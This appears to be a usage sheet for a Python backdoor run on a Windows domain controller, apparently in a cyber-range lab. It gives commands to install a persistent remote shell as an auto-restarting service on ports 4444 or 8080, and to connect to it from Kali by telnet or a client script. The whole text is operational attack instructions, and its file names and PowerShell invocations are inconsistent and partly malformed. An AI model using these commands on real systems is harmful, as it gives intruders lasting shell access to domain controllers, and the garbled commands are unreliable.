win_payload.py

USAGE INSTRUCTIONS (RUN ON VICTIM)
# Default installation (Port 4444, cmd mode, ONSTART trigger)
python win_payload.py

# Install as Windows Service (Auto-Restart)
iex "& { & 'C:\Users\cyberrange\Downloads\DC_Payload.py' '--install --port 4444 --mode cmd' }"

# PowerShell mode
iex "& { & 'C:\Users\cyberrange\Downloads\DC_Payload.py'; '--port 4444 --mode cmd' }"

# Custom port (e.g. 8080)
python win_payload.py --port 8080

# On Windows Server 2019 (Standard Edition)
python DC_Payload.py --mode powershell --install --port 8080

To Connection from Kali:
# Connect to the DC
telnet <DC_IP> 4444

USAGE INSTRUCTIONS(shell_client.py - RUN ON KALI)
# Start client listener
python DC_Client.py

# Custom port (e.g. 8080)
python DC_Client.py --port 8080

Powershell Mode(if DC is using powershell)
python DC_Client.py --mode powershell

# Host binding
python DC_Client.py --host 192.168.1.50 --port 4444
